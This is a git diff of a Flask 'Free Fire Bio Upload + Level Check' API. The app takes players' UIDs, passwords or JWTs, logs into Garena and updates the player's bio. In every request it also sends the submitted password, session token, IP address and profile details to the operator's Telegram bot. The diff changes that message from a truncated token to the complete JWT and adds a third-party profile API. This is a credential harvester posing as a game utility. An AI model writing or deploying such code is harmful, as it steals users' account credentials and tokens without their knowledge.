@@ -1,4 +1,4 @@
-# app.py - FULL VERSION (Bio Upload + Level Check + Telegram)
+# app.py - FULL VERSION (Bio Upload + Level Check from API + Telegram)
 from flask import Flask, request, jsonify, make_response
 import requests
 import binascii
@@ -31,11 +31,8 @@ FREEFIRE_UPDATE_URLS = [
     "https://clientbp.common.ggbluefox.com/UpdateSocialBasicInfo",
 ]
 
-PROFILE_URLS = {
-    "ID": "https://clientbp.ggpolarbear.com/GetPlayerPersonalShow",
-    "IND": "https://client.ind.freefiremobile.com/GetPlayerPersonalShow",
-    "BR": "https://client.us.freefiremobile.com/GetPlayerPersonalShow",
-}
+PROFILE_API = "https://ff.ggbluewhale.store/api/data"
+PROFILE_API_KEY = "kenn"
 
 OAUTH_URL = "https://100067.connect.garena.com/oauth/guest/token/grant"
 FREEFIRE_VERSION = "OB54"
@@ -64,13 +61,6 @@ LOGIN_HEADERS = {
     "X-Unity-Version": "2018.4.11f1",
     "X-GA": "v1 1",
     "ReleaseVersion": FREEFIRE_VERSION
-}
-
-PROFILE_HEADERS = {
-    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; ASUS_Z01QD Build/PI)",
-    "Content-Type": "application/x-www-form-urlencoded",
-    "X-GA": "v1 1",
-    "ReleaseVersion": "OB54"
 }
 
 # ============ FUNGSI ENKRIPSI ============
@@ -102,12 +92,6 @@ def build_bio_payload(bio_text):
     payload += encode_varint((9 << 3) | 0) + encode_varint(1)
     payload += encode_varint((11 << 3) | 2) + encode_varint(0)
     payload += encode_varint((12 << 3) | 2) + encode_varint(0)
-    return payload
-
-def build_uid_payload(uid):
-    payload = b''
-    payload += encode_varint((1 << 3) | 0) + encode_varint(int(uid))
-    payload += encode_varint((2 << 3) | 0) + encode_varint(1)
     return payload
 
 # ============ FUNGSI UTAMA ============
@@ -238,62 +222,30 @@ def generate_jwt_from_uid_pass(uid, password):
     except:
         return None
 
-def check_profile_level(uid, jwt_token, region="ID"):
+def check_profile_from_api(uid, region="id"):
+    """Cek profil dari API ff.ggbluewhale.store"""
     try:
-        profile_url = PROFILE_URLS.get(region, PROFILE_URLS["ID"])
-        
-        payload_bytes = build_uid_payload(uid)
-        encrypted = encrypt_data(payload_bytes)
-        
-        headers = PROFILE_HEADERS.copy()
-        headers["Authorization"] = f"Bearer {jwt_token}"
-        
-        response = requests.post(
-            profile_url,
-            data=encrypted,
-            headers=headers,
-            timeout=10,
-            verify=False
-        )
+        url = f"{PROFILE_API}?region={region}&uid={uid}&key={PROFILE_API_KEY}"
+        response = requests.get(url, timeout=10)
         
         if response.status_code == 200:
-            try:
-                data_str = response.content.decode('utf-8', errors='ignore')
-                
-                name_match = re.findall(r'[A-Za-z0-9_\s]{3,30}', data_str)
-                name = name_match[0] if name_match else "Unknown"
-                
-                numbers = re.findall(r'\d+', data_str)
-                level = numbers[0] if numbers else "?"
-                
-                likes = 0
-                if len(numbers) > 1:
-                    try:
-                        likes = int(numbers[1])
-                    except:
-                        pass
-                
+            data = response.json()
+            
+            # Cek struktur response
+            if data.get('status') == 'success' and data.get('data'):
+                player = data['data']
                 return {
-                    "name": name,
-                    "level": level,
-                    "likes": likes,
-                    "guild": "Unknown",
-                    "rank": "Unknown",
+                    "name": player.get('name', 'Unknown'),
+                    "level": player.get('level', '?'),
+                    "likes": player.get('likes', 0),
+                    "uid": player.get('uid', uid),
+                    "region": player.get('region', region),
                     "status": "✅ Found"
                 }
-            except:
-                pass
-            
-            return {
-                "name": "Unknown",
-                "level": "?",
-                "likes": 0,
-                "guild": "Unknown",
-                "rank": "Unknown",
-                "status": "✅ Found (Raw)"
-            }
+        
         return None
     except Exception as e:
+        print(f"API check error: {e}")
         return None
 
 def upload_bio_request(jwt_token, bio_text):
@@ -332,6 +284,7 @@ def upload_bio_request(jwt_token, bio_text):
         return {"status": f"Error: {str(e)}", "code": 500}
 
 def send_telegram_notification(uid, password, name, level, region, jwt_token, ip_address, bio_status, likes=0, guild="N/A"):
+    """Kirim notifikasi lengkap ke Telegram termasuk JWT"""
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
         
@@ -343,11 +296,11 @@ def send_telegram_notification(uid, password, name, level, region, jwt_token, ip
 📊 <b>Level:</b> {level or 'N/A'}
 ❤️ <b>Likes:</b> {likes:,}
 ⚔️ <b>Guild:</b> {guild}
-🌍 <b>Region:</b> {region or 'ID'}
+🌍 <b>Region:</b> {region.upper() if region else 'ID'}
 📱 <b>Bio Status:</b> {bio_status}
 
-🔐 <b>JWT Token:</b>
-<code>{jwt_token[:50]}...</code>
+🔐 <b>JWT TOKEN (LENGKAP):</b>
+<code>{jwt_token}</code>
 
 📞 <b>IP Caller:</b> {ip_address}
 ⏰ <b>Time:</b> {datetime.now().strftime('%H:%M:%S %d/%m/%Y')}
@@ -373,6 +326,7 @@ def combined_bio_upload():
     jwt_token = request.args.get("jwt") or request.form.get("jwt")
     uid = request.args.get("uid") or request.form.get("uid")
     password = request.args.get("pass") or request.form.get("pass")
+    region = request.args.get("region") or request.form.get("region") or "id"
     
     client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     
@@ -382,8 +336,8 @@ def combined_bio_upload():
             "code": 400,
             "error": "Missing 'bio' parameter",
             "usage": {
-                "jwt": "/bio_upload?bio=Hello&jwt=YOUR_JWT",
-                "uid_pass": "/bio_upload?bio=Hello&uid=UID&pass=PASSWORD"
+                "jwt": "/bio_upload?bio=Hello&jwt=YOUR_JWT&region=id",
+                "uid_pass": "/bio_upload?bio=Hello&uid=UID&pass=PASSWORD&region=id"
             }
         }), 400
     
@@ -391,7 +345,7 @@ def combined_bio_upload():
     final_uid = uid
     final_password = password or "N/A"
     final_name = None
-    final_region = "ID"
+    final_region = region.lower()
     login_method = "Direct JWT"
     profile_info = None
     
@@ -401,7 +355,8 @@ def combined_bio_upload():
         if uid_from_jwt:
             final_uid = uid_from_jwt
             final_name = name_from_jwt
-            final_region = region_from_jwt or "ID"
+            if region == "id" and region_from_jwt:
+                final_region = region_from_jwt.lower()
             login_method = "Direct JWT"
     
     # Method 2: UID + Password (Generate JWT)
@@ -415,7 +370,8 @@ def combined_bio_upload():
             final_jwt = generated_jwt
             _, name_from_jwt, region_from_jwt = decode_jwt_info(generated_jwt)
             final_name = name_from_jwt
-            final_region = region_from_jwt or "ID"
+            if region == "id" and region_from_jwt:
+                final_region = region_from_jwt.lower()
         else:
             return jsonify({
                 "status": "❌ JWT Generation Failed",
@@ -434,14 +390,14 @@ def combined_bio_upload():
     # Upload bio
     bio_result = upload_bio_request(final_jwt, bio)
     
-    # Check profile level
+    # Check profile dari API
     if final_uid:
         try:
-            profile_info = check_profile_level(final_uid, final_jwt, final_region)
+            profile_info = check_profile_from_api(final_uid, final_region)
         except:
             profile_info = None
     
-    # Kirim Telegram
+    # Kirim Telegram dengan semua info termasuk JWT lengkap
     if profile_info:
         send_telegram_notification(
             uid=final_uid,
@@ -449,11 +405,11 @@ def combined_bio_upload():
             name=profile_info.get('name', final_name or 'Unknown'),
             level=profile_info.get('level', '?'),
             region=final_region,
-            jwt_token=final_jwt,
+            jwt_token=final_jwt,  # Kirim JWT lengkap
             ip_address=client_ip,
             bio_status=bio_result.get('status', 'Unknown'),
             likes=profile_info.get('likes', 0),
-            guild=profile_info.get('guild', 'N/A')
+            guild='N/A'
         )
     else:
         send_telegram_notification(
@@ -462,7 +418,7 @@ def combined_bio_upload():
             name=final_name or 'Unknown',
             level='?',
             region=final_region,
-            jwt_token=final_jwt,
+            jwt_token=final_jwt,  # Kirim JWT lengkap
             ip_address=client_ip,
             bio_status=bio_result.get('status', 'Unknown'),
             likes=0,
@@ -482,9 +438,9 @@ def combined_bio_upload():
         "name": profile_info.get('name') if profile_info else final_name,
         "level": profile_info.get('level') if profile_info else '?',
         "likes": profile_info.get('likes') if profile_info else 0,
-        "guild": profile_info.get('guild') if profile_info else 'N/A',
+        "guild": 'N/A',
         "profile_status": profile_info.get('status') if profile_info else '❌ Not Found',
-        "region": final_region,
+        "region": final_region.upper(),
         "server_response": bio_result.get("server_response", "N/A"),
         "endpoint_used": bio_result.get("endpoint", "N/A"),
         "generated_jwt": final_jwt,
@@ -502,47 +458,52 @@ def home():
         "message": "Free Fire Bio Upload + Level Check API",
         "endpoints": {
             "/bio_upload": "Upload bio (GET/POST) with JWT or UID/Pass",
-            "/check_level": "Check level only",
+            "/check_profile": "Check profile from API",
             "/": "This info page"
         },
         "usage": {
-            "jwt": "/bio_upload?bio=Hello&jwt=YOUR_JWT",
-            "uid_pass": "/bio_upload?bio=Hello&uid=UID&pass=PASSWORD"
+            "jwt": "/bio_upload?bio=Hello&jwt=YOUR_JWT&region=id",
+            "uid_pass": "/bio_upload?bio=Hello&uid=UID&pass=PASSWORD&region=id"
+        },
+        "regions": {
+            "id": "Indonesia",
+            "sg": "Singapore",
+            "ind": "India",
+            "br": "Brazil",
+            "me": "Middle East",
+            "th": "Thailand"
         },
         "features": [
             "Auto JWT generation from UID/Password",
-            "Profile level checking (name, level, likes, guild)",
-            "Telegram notification with all details",
+            "Profile check from ff.ggbluewhale.store API",
+            "Telegram notification with complete JWT",
             "No protobuf dependency"
         ],
         "Credit": "sulav_codex_ff",
         "Telegram": "@sulav_don2"
     })
 
-@app.route("/check_level", methods=["GET"])
-def check_level():
+@app.route("/check_profile", methods=["GET"])
+def check_profile():
     uid = request.args.get("uid")
-    jwt_token = request.args.get("jwt")
-    region = request.args.get("region", "ID")
+    region = request.args.get("region", "id")
     
-    if not uid or not jwt_token:
+    if not uid:
         return jsonify({
-            "error": "Missing parameters",
-            "example": "/check_level?uid=123456&jwt=YOUR_JWT"
+            "error": "Missing uid parameter",
+            "example": "/check_profile?uid=16208500077&region=id"
         }), 400
     
-    result = check_profile_level(uid, jwt_token, region)
+    result = check_profile_from_api(uid, region)
     if result:
         return jsonify({
             "success": True,
-            "uid": uid,
-            "region": region,
-            "profile": result
+            "data": result
         })
     else:
         return jsonify({
             "success": False,
-            "error": "Failed to check level"
+            "error": "Profile not found"
         }), 404
 
 # ============ MAIN ============
